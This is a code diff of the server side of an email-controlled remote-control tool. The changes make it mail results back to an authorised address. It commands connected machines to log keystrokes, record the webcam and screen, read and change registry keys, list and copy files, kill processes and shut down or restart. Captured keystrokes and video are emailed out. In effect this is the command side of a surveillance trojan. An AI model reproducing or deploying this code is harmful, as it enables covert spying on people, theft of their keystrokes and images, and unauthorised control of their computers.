@@ -8,7 +8,8 @@ import os
 from time import sleep
 from random import choices
 
-import mail_provider_handle.send_mail
+# import mail_provider_handle.SMTP_service
+from mail_provider_handle import SMTP_service as sp
 
 BUFSIZ = 4 * 1024
 
@@ -16,6 +17,9 @@ conn_ip_list = [] # list_ip() # Tuple (conn, addr)
 
 auth_dict = defaultdict(lambda: False) # MAIL -> bool
 email_ip_dict = {} # MAIL -> IP
+ip_email_dict = {} # IP -> MAIL (inverse function)
+
+action_dictionary = {}
 
 # def authorize(sender_address, ip_address, ip_per_address):
 #     if sender_address in ip_per_address:
@@ -29,14 +33,25 @@ def authorize(email, ip):
     if (email not in auth_dict) or (not auth_dict[email]):
         auth_dict[email] = True
         email_ip_dict[email] = ip
+        ip_email_dict[ip] = email
+        sp.send_threading(email, "AUTH", "OK")
+    else:
+        sp.send_threading(email, "AUTH", "ALREADY AUTHORIZED / CONTROLLED")
 
-def list_ip():
-    return [elem[1] for elem in conn_ip_list]
+def list_ip(email):
+    ips = '\n'.join([elem[1][0] + ':' + str(elem[1][1]) for elem in conn_ip_list])
+    sp.send_threading(email, "LIST", ips)
+
+    # return [elem[1] for elem in conn_ip_list]
 
 def disconnect(email):
     if email in auth_dict and auth_dict[email]:
         auth_dict[email] = False
+        ip_email_dict[email_ip_dict[email]] = None
         email_ip_dict[email] = None
+        
+        sp.send_threading(email, "DISC", "OK")
+    sp.send_threading(email, "DISC", "NOT AUTH YET")
 
 def find_corresponding_email(ip_address):
     for i in email_ip_dict:
@@ -58,12 +73,10 @@ def remove_this_connection(conn, ip_address):
     email = find_corresponding_email(ip_address)
     disconnect(email)
 
-action_dictionary = {}
-result_dictionary = {} # Tuple ! (COMMAND_TYPE, DATA_TYPE, DATA, (file_name if DATA = 'bytes'))
 def __init__():
     for i in conn_ip_list:
         action_dictionary[i[1]] = Queue(maxsize=0)
-        result_dictionary[i[1]] = Queue(maxsize=0)
+        # result_dictionary[i[1]] = Queue(maxsize=0)
 
 def list_process(ip_address):
     def action_message(conn):
@@ -71,8 +84,9 @@ def list_process(ip_address):
 
         result = app_process_server._list(conn, "PROCESS")
         conn.sendall(b'QUIT') # Quit current command
-        result_dictionary[ip_address].put(('LIST PROCESS', 'str',result)) #
-        print(result)
+        # result_dictionary[ip_address].put(('LIST PROCESS', 'str',result)) #
+        sp.send_threading(ip_email_dict[ip_address], "LIST PROCESS", str(result))
+        # print(result)
 
     action_dictionary[ip_address].put(action_message)
 
@@ -83,8 +97,9 @@ def list_application(ip_address):
 
         result = app_process_server._list(conn, "APPLICATION")
         conn.sendall(b'QUIT') # Quit current command
-        result_dictionary[ip_address].put(result)
-        print(result)
+        # result_dictionary[ip_address].put(result)
+        sp.send_threading(ip_email_dict[ip_address], "LIST APP", str(result))
+        # print(result)
     
     action_dictionary[ip_address].put(action_message)
 
@@ -94,8 +109,9 @@ def kill_process(ip_address, id):
 
         result = app_process_server.send_kill(conn, id)
         conn.sendall(b'QUIT') # Quit current command
-        result_dictionary[ip_address].put(result)
-        print(result)
+        # result_dictionary[ip_address].put(result)
+        sp.send_threading(ip_email_dict[ip_address], "KILL PROCESS", str(result))
+        # print(result)
 
     action_dictionary[ip_address].put(action_message)
 
@@ -105,8 +121,9 @@ def kill_application(ip_address, id):
 
         result = app_process_server.send_kill(conn, id)
         conn.sendall(b'QUIT') # Quit current command
-        result_dictionary[ip_address].put(result)
-        print(result)
+        # result_dictionary[ip_address].put(result)
+        sp.send_threading(ip_email_dict[ip_address], "KILL APP", str(result))
+        # print(result)
     
     action_dictionary[ip_address].put(action_message)
 
@@ -123,9 +140,11 @@ def capture_webcam(ip_address, time=5):
                 r = conn.recv(BUFSIZ)
                 data_to_recv += r
             data_to_recv = data_to_recv[:size_to_recv] # Remove additional bytes
-            result_dictionary[ip_address].put(data_to_recv)
+            # result_dictionary[ip_address].put(data_to_recv)
+            sp.send_threading(ip_email_dict[ip_address], "WEBCAM", data_to_recv, "file.avi")
         except:
-            result_dictionary[ip_address].put('FAIL')
+            # result_dictionary[ip_address].put('FAIL')
+            sp.send_threading(ip_email_dict[ip_address], "WEBCAM", "FAIL")
     action_dictionary[ip_address].put(action_message)
 
 def create_video(image_folder: str):
@@ -200,7 +219,8 @@ def capture_screen(ip_address, time=0.5): # Not done ! need more fix for multi t
         
         file_open = open(video_name, 'rb')
         file_data = file_open.read()
-        result_dictionary[ip_address].put(file_data)
+        # result_dictionary[ip_address].put(file_data)
+        sp.send_threading(ip_email_dict[ip_address], "LIVESCREEN", file_data, 'file.avi')
         file_open.close()
         
     action_dictionary[ip_address].put(action_message)
@@ -214,7 +234,8 @@ def shut_down(ip_address):
         remove_this_connection(conn, ip_address)
 
         result = 'OK'
-        result_dictionary[ip_address].put(result)
+        # result_dictionary[ip_address].put(result)
+        sp.send_threading(ip_email_dict[ip_address], "SHUTDOWN", result)
 
     action_dictionary[ip_address].put(action_message)
 
@@ -225,7 +246,8 @@ def logout(ip_address):
         remove_this_connection(conn, ip_address)
 
         result = 'OK'
-        result_dictionary[ip_address].put(result)
+        # result_dictionary[ip_address].put(result)
+        sp.send_threading(ip_email_dict[ip_address], "LOGOUT", result)
 
     action_dictionary[ip_address].put(action_message)
 
@@ -236,7 +258,7 @@ def restart(ip_address):
         remove_this_connection(conn, ip_address)
 
         result = 'OK'
-        result_dictionary[ip_address].put(result)
+        sp.send_threading(ip_email_dict[ip_address], "RESTART", result)
 
     action_dictionary[ip_address].put(action_message)
 
@@ -245,8 +267,9 @@ def mac_address(ip_address):
         conn.sendall(bytes("MAC", "utf8"))
 
         result = mac_address_server.mac_address(conn)
-        result_dictionary[ip_address].put(result)
-        print(result)
+        # result_dictionary[ip_address].put(result)
+        sp.send_threading(ip_email_dict[ip_address], "MAC", result)
+        # print(result)
 
     action_dictionary[ip_address].put(action_message)
 
@@ -260,8 +283,9 @@ def keylog(ip_address, time=10):
 
         data = conn.recv(BUFSIZ)      
         conn.sendall(b'QUIT'.ljust(BUFSIZ))
-        result_dictionary[ip_address].put(data.decode('utf8'))
-        print(data.decode('utf8'))
+        # result_dictionary[ip_address].put(data.decode('utf8'))
+        sp.send_threading(ip_email_dict[ip_address], "KEYLOG", data.decode('utf8'))
+        # print(data.decode('utf8'))
 
     action_dictionary[ip_address].put(action_message)
 
@@ -277,8 +301,9 @@ def registry_list(ip_address, full_path):
             r = conn.recv(BUFSIZ)
             data_to_recv += r
         data_to_recv = data_to_recv[:size_to_recv] 
-        result_dictionary[ip_address].put(data_to_recv)
-        print(data_to_recv)
+        # result_dictionary[ip_address].put(data_to_recv)
+        sp.send_threading(ip_email_dict[ip_address], "REGISTRY LIST", data_to_recv.decode('utf8'))
+        # print(data_to_recv)
 
     action_dictionary[ip_address].put(action_message)
         
@@ -294,8 +319,9 @@ def registry_update(ip_address, absolute_path, value, data_type):
         conn.sendall(bytes(data_type, "utf8"))
         
         ack = conn.recv(BUFSIZ).decode('utf8')
-        result_dictionary[ip_address].put(ack)
-        print(ack)
+        # result_dictionary[ip_address].put(ack)
+        sp.send_threading(ip_email_dict[ip_address], "REGISTRY UPDATE", ack)
+        # print(ack)
 
     action_dictionary[ip_address].put(action_message)
 
@@ -311,8 +337,9 @@ def dir_list(ip_address, path_to_folder):
             data_to_recv += r
         
         data_to_recv = data_to_recv[:size_to_recv] 
-        print(data_to_recv.decode('utf8'))
-        result_dictionary[ip_address].put(data_to_recv)
+        # print(data_to_recv.decode('utf8'))
+        # result_dictionary[ip_address].put(data_to_recv)
+        sp.send_threading(ip_email_dict[ip_address], "DIR LIST", data_to_recv.decode('utf8'))
 
     action_dictionary[ip_address].put(action_message)
 
@@ -325,8 +352,9 @@ def dir_copy(ip_address, src_path, dst_path):
         conn.sendall(bytes(dst_path, "utf8"))
 
         ack = conn.recv(BUFSIZ).decode('utf8')
-        result_dictionary[ip_address].put(ack)
-        print(ack)
+        # result_dictionary[ip_address].put(ack)
+        sp.send_threading(ip_email_dict[ip_address], "DIR COPY", ack)
+        # print(ack)
     action_dictionary[ip_address].put(action_message)
 
 def raise_error_message(error_message):
